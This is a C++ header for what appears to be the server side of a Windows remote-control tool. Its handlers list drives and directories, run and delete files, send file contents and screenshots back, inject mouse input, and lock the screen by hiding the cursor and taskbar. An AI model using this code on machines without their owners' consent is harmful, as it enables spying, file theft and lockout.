#pragma once
#include <map>
#include <atlimage.h>
#include <direct.h>
#include<io.h>
#include<stdio.h>
#include<list>
#include "BlackTool.h"
#include "LockInfoDialog.h"
#include "Resource.h"
#include "Packet.h"
#pragma warning(disable:4966)//fopen sprintf strcpy strstr

class CCommand
{
public:
    CCommand();
    ~CCommand() {};
    int ExcuteCommand(int nCmd, std::list<CPacket>& IstPacket, CPacket& inPacket);
    static void RunCommand(void* arg, int status, std::list<CPacket>&IstPacket, CPacket& inPacket) {
        CCommand* thiz = (CCommand*)arg;
        if (status > 0) {
            int ret = thiz->ExcuteCommand(status,IstPacket,inPacket);
            if (ret!=0) {
                TRACE("执行命令失败：%d ret=%d\r\n", status, ret);
            }
        }
        else {
            MessageBox(NULL, _T("无法正常接入用户，自动重试"), _T("接入用户失败"), MB_OK | MB_ICONERROR);
        }
    }
protected:
    typedef int(CCommand::* CMDFUNC)(std::list<CPacket>&, CPacket& inPacket);//成员函数指针
    std::map<int, CMDFUNC> m_mapFunction;
    CLockInfoDialog dlg;
    unsigned threadid;
protected:
    static unsigned __stdcall threadLockDlg(void* arg) {
        CCommand* thiz = (CCommand*)arg;
        thiz->threadLockDlgMain();
        _endthreadex(0);
        return 0;
    }

    void threadLockDlgMain() {
        TRACE("%s(%d):%d\r\n", __FUNCTION__, __LINE__, GetCurrentThreadId());
        dlg.Create(IDD_DIALOG_INFO, NULL);
        dlg.ShowWindow(SW_SHOW);
        //遮蔽后台窗口
        CRect rect;
        rect.left = 0;
        rect.top = 0;
        rect.right = GetSystemMetrics(SM_CXFULLSCREEN);//w1
        rect.bottom = GetSystemMetrics(SM_CYFULLSCREEN);
        rect.bottom = LONG(rect.bottom * 1.10);
        TRACE("right=%d bottom=%d\r\n", rect.right, rect.bottom);
        dlg.MoveWindow(rect);
        CWnd* pText = dlg.GetDlgItem(IDC_STATIC);
        if (pText) {
            CRect rtText;
            pText->GetWindowRect(rtText);
            int nWith = rtText.Width();//w0
            int x = (rect.right - nWith) / 2;
            int nHeight = rtText.Height();
            int y = (rect.bottom - nHeight) / 2;
            pText->MoveWindow(x, y, rtText.Width(), rtText.Height());
        }
        //窗口置顶
        dlg.SetWindowPos(&dlg.wndTopMost, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
        //限制鼠标功能
        ShowCursor(false);
        //隐藏任务栏
        ::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_HIDE);
        dlg.GetWindowRect(rect);
        rect.left = 0;
        rect.top = 0;
        rect.right = 1;
        rect.bottom = 1;
        ClipCursor(rect);//限制鼠标活动范围
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            if (msg.message == WM_KEYDOWN) {
                TRACE("msg:%08X wparam:%08X lparam:%08X\r\n", msg.message, msg.wParam, msg.lParam);
                if (msg.wParam == 0x41) {//按下a键 退出 ESC(1B)
                    break;
                }
            }
        }
        ClipCursor(NULL);//恢复鼠标活动范围
        //恢复鼠标
        ShowCursor(true);
        //恢复任务栏
        ::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_SHOW);
        dlg.DestroyWindow();
    }

    int MakeDriverInfo(std::list<CPacket>& IstPacket, CPacket& inPacket) {//1==>A 2==>B 3==>C ... 26==>Z
        std::string result;
        for (int i = 1; i <= 26; i++) {
            if (_chdrive(i) == 0) {
                if (result.size() > 0)
                    result += ',';
                result += 'A' + i - 1;
            }
        }
        IstPacket.push_back(CPacket(1, (BYTE*)result.c_str(), result.size()));
        return 0;
    }

    int MakeDirectoryInfo(std::list<CPacket>& IstPacket, CPacket& inPacket) {
        std::string strPath = inPacket.strData;
        //std::list<FILEINFO> lstFileInfos;
        if (_chdir(strPath.c_str()) != 0) {
            FILEINFO finfo;
            finfo.HashNext = FALSE;
            IstPacket.push_back(CPacket(2, (BYTE*)&finfo, sizeof(finfo)));
            OutputDebugString(_T("没有权限，访问目录！！"));
            return -2;
        }
        _finddata_t fdata;
        int hfind = 0;
        if ((hfind = _findfirst("*", &fdata)) == -1) {
            OutputDebugString(_T("没找到任何文件！！"));
            FILEINFO finfo;
            finfo.HashNext = FALSE;
            IstPacket.push_back(CPacket(2, (BYTE*)&finfo, sizeof(finfo)));
            return -3;
        }
        int count = 0;
        do {
            FILEINFO finfo;
            finfo.IsDirectory = (fdata.attrib & _A_SUBDIR) != 0;
            memcpy(finfo.szFileName, fdata.name, strlen(fdata.name));
            TRACE("%s\r\n", finfo.szFileName); 
            IstPacket.push_back(CPacket(2, (BYTE*)&finfo, sizeof(finfo)));
            count++;
        } while (!_findnext(hfind, &fdata));
        TRACE("server:count=%d\r\n", count);
        //发送信息到控制端
        FILEINFO finfo;
        finfo.HashNext = FALSE;
        IstPacket.push_back(CPacket(2, (BYTE*)&finfo, sizeof(finfo)));
        return 0;
    }

    int RunFile(std::list<CPacket>& IstPacket, CPacket& inPacket) {
        std::string strPath = inPacket.strData;
        ShellExecuteA(NULL, NULL, strPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
        IstPacket.push_back(CPacket(3, NULL, 0));
        return 0;
    }

    int DownloadFile(std::list<CPacket>& IstPacket, CPacket& inPacket) {
        std::string strPath = inPacket.strData;
        long long data = 0;
        FILE* pFile = NULL;
        errno_t err = fopen_s(&pFile, strPath.c_str(), "rb");
        if (err != 0) {
            IstPacket.push_back(CPacket(4, (BYTE*)&data, 8));
            return -1;
        }
        if (pFile != NULL) {
            fseek(pFile, 0, SEEK_END);
            data = _ftelli64(pFile);
            IstPacket.push_back(CPacket(4, (BYTE*)&data, 8));
            fseek(pFile, 0, SEEK_SET);
            char buffer[1024] = "";
            size_t rlen = 0;
            do {
                rlen = fread(buffer, 1, 1024, pFile);
                IstPacket.push_back(CPacket(4, (BYTE*)buffer, rlen));
            } while (rlen >= 1024);
            fclose(pFile);
        }
        else {
            IstPacket.push_back(CPacket(4, (BYTE*)&data, 8));
        }
        return 0;
    }

    int MouseEvent(std::list<CPacket>& IstPacket, CPacket& inPacket) {
        MOUSEEV mouse;
        memcpy(&mouse, inPacket.strData.c_str(), sizeof(MOUSEEV));
        DWORD nFlags = 0;
        switch (mouse.nButton) {
        case 0://左键
            nFlags = 1;
            break;
        case 1://右键
            nFlags = 2;
            break;
        case 2://中键
            nFlags = 4;
            break;
        case 4://没有按键
            nFlags = 8;
            break;
        }
        if (nFlags != 8)SetCursorPos(mouse.ptXY.x, mouse.ptXY.y);
        switch (mouse.nAction) {
        case 0://单击
            nFlags |= 0x10;
            break;
        case 1://双击
            nFlags |= 0x20;
            break;
        case 2://按下
            nFlags |= 0x40;
            break;
        case 3://放开
            nFlags |= 0x80;
            break;
        default:
            break;
        }
        TRACE("mouse event:%08X x %d y %d\r\n", nFlags, mouse.ptXY.x, mouse.ptXY.y);
        switch (nFlags) {
        case 0x21://左键双击
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
        case 0x11://左键单击
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
            break;
        case 0x41://左键按下
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
            break;
        case 0x81://左键放开
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
            break;
        case 0x22://右键双击
            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
        case 0x12://右键单击
            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
            break;
        case 0x42://右键按下
            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
            break;
        case 0x82://右键放开
            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
            break;
        case 0x24://中键双击
            mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
            mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
        case 0x14://中键单击
            mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
            mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
            break;
        case 0x44://中键按下
            mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
            break;
        case 0x84://中键放开
            mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
            break;
        case 0x08://单纯的鼠标移动
            mouse_event(MOUSEEVENTF_MOVE, mouse.ptXY.x, mouse.ptXY.y, 0, GetMessageExtraInfo());
            break;
        }
        IstPacket.push_back(CPacket(5, NULL, 0));
        return 0;
    }

    int SendScreen(std::list<CPacket>& IstPacket, CPacket& inPacket) {
        CImage screen;//GDI
        HDC hScreen = ::GetDC(NULL);
        int nBitPerPixel = GetDeviceCaps(hScreen, BITSPIXEL);
        int nWidth = GetDeviceCaps(hScreen, HORZRES);
        int nHeight = GetDeviceCaps(hScreen, VERTRES);
        screen.Create(nWidth, nHeight, nBitPerPixel);
        BitBlt(screen.GetDC(), 0, 0, nWidth, nHeight, hScreen, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hScreen);
        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, 0);
        if (hMem == NULL)return -1;
        IStream* pStream = NULL;
        HRESULT ret = CreateStreamOnHGlobal(hMem, TRUE, &pStream);
        if (ret == S_OK) {
            screen.Save(pStream, Gdiplus::ImageFormatPNG);
            LARGE_INTEGER bg = { 0 };
            pStream->Seek(bg, STREAM_SEEK_SET, NULL);
            PBYTE pData = (PBYTE)GlobalLock(hMem);
            SIZE_T nSize = GlobalSize(hMem);
            IstPacket.push_back(CPacket(6, pData, nSize));
            GlobalUnlock(hMem);
        }
        pStream->Release();
        GlobalFree(hMem);
        screen.ReleaseDC();
        return 0;
    }

    int LockMachine(std::list<CPacket>& IstPacket, CPacket& inPacket) {
        if ((dlg.m_hWnd == NULL) || (dlg.m_hWnd == INVALID_HANDLE_VALUE)) {
            //_beginthread(threadLockDlg, 0, NULL);
            _beginthreadex(NULL, 0, &CCommand::threadLockDlg, this, 0, &threadid);
            TRACE("threadid=%d\r\n", threadid);
        }
        IstPacket.push_back(CPacket(7, NULL, 0));
        return 0;
    }

    int UnlockMachine(std::list<CPacket>& IstPacket, CPacket& inPacket) {
        //dlg.SendMessage(WM_KEYDOWN, 0x41, 0x01E0001);
        //::SendMessage(dlg.m_hWnd, WM_KEYDOWN, 0x41, 0x01E0001);
        PostThreadMessage(threadid, WM_KEYDOWN, 0x41, 0);
        IstPacket.push_back(CPacket(8, NULL, 0));
        return 0;
    }

    int TestConnect(std::list<CPacket>& IstPacket, CPacket& inPacket) {
        IstPacket.push_back(CPacket(1981, NULL, 0));
        return 0;
    }

    int DeleteLoaclFile(std::list<CPacket>& IstPacket, CPacket& inPacket) {
        std::string strPath = inPacket.strData;
        TCHAR sPath[MAX_PATH] = _T("");
        //mbstowcs(sPath, strPath.c_str(), strPath.size());//中文编码容易乱码
        MultiByteToWideChar(CP_ACP, 0, strPath.c_str(), strPath.size(), sPath, sizeof(sPath) / sizeof(TCHAR));
        DeleteFileA(strPath.c_str());
        IstPacket.push_back(CPacket(9, NULL, 0));
        return 0;
    }
};

